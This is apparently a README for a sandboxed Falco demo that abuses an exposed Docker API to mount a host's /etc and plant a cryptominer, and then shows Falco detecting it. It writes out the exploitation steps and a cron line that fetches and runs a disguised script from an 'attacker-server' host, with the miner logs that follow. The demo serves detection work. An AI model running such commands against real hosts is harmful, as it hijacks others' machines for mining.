# Demo of Falco Detecting Cryptomining Exploit

## Introduction

Based on a [blog post](https://sysdig.com/blog/detecting-cryptojacking/) we wrote, this example shows how an overly permissive container environment can be exploited to install cryptomining software and how use of the exploit can be detected using Sysdig Falco.

Although the exploit in the blog post involved modifying the cron configuration on the host filesystem, in this example we keep the host filesystem untouched. Instead, we have a container play the role of the "host", and set up everything using [docker-compose](https://docs.docker.com/compose/) and [docker-in-docker](https://hub.docker.com/_/docker/).

## Requirements

In order to run this example, you need Docker Engine >= 1.13.0 and docker-compose >= 1.10.0, as well as curl.

## Example architecture

The example consists of the following:

* `host-machine`: A docker-in-docker instance that plays the role of the host machine. It runs a cron daemon and an independent copy of the docker daemon that listens on port 2375. This port is exposed to the world, and this port is what the attacker will use to install new software on the host.
* `attacker-server`: A nginx instance that serves the malicious files and scripts using by the attacker.
* `falco`: A Falco instance to detect the suspicious activity. It connects to the docker daemon on `host-machine` to fetch container information.

All of the above are configured in the docker-compose file [demo.yml](./demo.yml).

A separate container is created to launch the attack:

* `docker123321-mysql` An [alpine](https://hub.docker.com/_/alpine/) container that mounts /etc from `host-machine` into /mnt/etc within the container. The json container description is in the file [docker123321-mysql-container.json](./docker123321-mysql-container.json).

## Example Walkthrough

### Start everything using docker-compose

To make sure you're starting from scratch, first run `docker-compose -f demo.yml down -v` to remove any existing containers, volumes, etc.

Then run `docker-compose -f demo.yml up --build` to create the `host-machine`, `attacker-server`, and `falco` containers.

You will see fairly verbose output from dockerd:

```
host-machine_1     | crond: crond (busybox 1.27.2) started, log level 6
host-machine_1     | time="2018-03-15T15:59:51Z" level=info msg="starting containerd" module=containerd revision=9b55aab90508bd389d7654c4baf173a981477d55 version=v1.0.1
host-machine_1     | time="2018-03-15T15:59:51Z" level=info msg="loading plugin "io.containerd.content.v1.content"..." module=containerd type=io.containerd.content.v1
host-machine_1     | time="2018-03-15T15:59:51Z" level=info msg="loading plugin "io.containerd.snapshotter.v1.btrfs"..." module=containerd type=io.containerd.snapshotter.v1
```

When you see log output like the following, you know that falco is started and ready:

```
falco_1            | Wed Mar 14 22:37:12 2018: Falco initialized with configuration file /etc/falco/falco.yaml
falco_1            | Wed Mar 14 22:37:12 2018: Parsed rules from file /etc/falco/falco_rules.yaml
falco_1            | Wed Mar 14 22:37:12 2018: Parsed rules from file /etc/falco/falco_rules.local.yaml
```

### Launch malicious container

To launch the malicious container, we will connect to the docker instance running in `host-machine`, which has exposed port 2375 to the world. We create and start a container via direct use of the docker API (although you can do the same via `docker run -H http://localhost:2375 ...`.

The script `launch_malicious_container.sh` performs the necessary POSTs:

* `http://localhost:2375/images/create?fromImage=alpine&tag=latest`
* `http://localhost:2375/containers/create?&name=docker123321-mysql`
* `http://localhost:2375/containers/docker123321-mysql/start`

Run the script via `bash launch_malicious_container.sh`.

### Examine cron output as malicious software is installed & run

`docker123321-mysql` writes the following line to `/mnt/etc/crontabs/root`, which corresponds to `/etc/crontabs/root` on the host:

```
* * * * * curl -s http://attacker-server:8220/logo3.jpg | bash -s
```

It also touches the file `/mnt/etc/crontabs/cron.update`, which corresponds to `/etc/crontabs/cron/update` on the host, to force cron to re-read its cron configuration. This ensures that every minute, cron will download the script (disguised as [logo3.jpg](attacker_files/logo3.jpg))  from `attacker-server` and run it.

You can see `docker123321-mysql` running by checking the container list for the docker instance running in `host-machine` via `docker -H localhost:2375 ps`. You should see output like the following:

```
CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES
68ed578bd034        alpine:latest       "/bin/sh -c 'echo '*…"   About a minute ago   Up About a minute                       docker123321-mysql
```

Once the cron job runs, you will see output like the following:

```
host-machine_1     | crond: USER root pid 187 cmd curl -s http://attacker-server:8220/logo3.jpg | bash -s
host-machine_1     | ***Checking for existing Miner program
attacker-server_1  | 172.22.0.4 - - [14/Mar/2018:22:38:00 +0000] "GET /logo3.jpg HTTP/1.1" 200 1963 "-" "curl/7.58.0" "-"
host-machine_1     | ***Killing competing Miner programs
host-machine_1     | ***Reinstalling cron job to run Miner program
host-machine_1     | ***Configuring Miner program
attacker-server_1  | 172.22.0.4 - - [14/Mar/2018:22:38:00 +0000] "GET /config_1.json HTTP/1.1" 200 50 "-" "curl/7.58.0" "-"
attacker-server_1  | 172.22.0.4 - - [14/Mar/2018:22:38:00 +0000] "GET /minerd HTTP/1.1" 200 87 "-" "curl/7.58.0" "-"
host-machine_1     | ***Configuring system for Miner program
host-machine_1     | vm.nr_hugepages = 9
host-machine_1     | ***Running Miner program
host-machine_1     | ***Ensuring Miner program is alive
host-machine_1     |   238 root       0:00 {jaav} /bin/bash ./jaav -c config.json -t 3
host-machine_1     | /var/tmp
host-machine_1     | runing.....
host-machine_1     | ***Ensuring Miner program is alive
host-machine_1     |   238 root       0:00 {jaav} /bin/bash ./jaav -c config.json -t 3
host-machine_1     | /var/tmp
host-machine_1     | runing.....
```

### Observe Falco detecting malicious activity

To observe Falco detecting the malicious activity, you can look for `falco_1` lines in the output. Falco will detect the container launch with the sensitive mount:

```
falco_1            | 22:37:24.478583438: Informational Container with sensitive mount started (user=root command=runc:[1:CHILD] init docker123321-mysql (id=97587afcf89c) image=alpine:latest mounts=/etc:/mnt/etc::true:rprivate)
falco_1            | 22:37:24.479565025: Informational Container with sensitive mount started (user=root command=sh -c echo '* * * * * curl -s http://attacker-server:8220/logo3.jpg | bash -s' >> /mnt/etc/crontabs/root && sleep 300 docker123321-mysql (id=97587afcf89c) image=alpine:latest mounts=/etc:/mnt/etc::true:rprivate)
```

### Cleanup

To tear down the environment, stop the script using ctrl-C and remove everything using `docker-compose -f demo.yml down -v`.

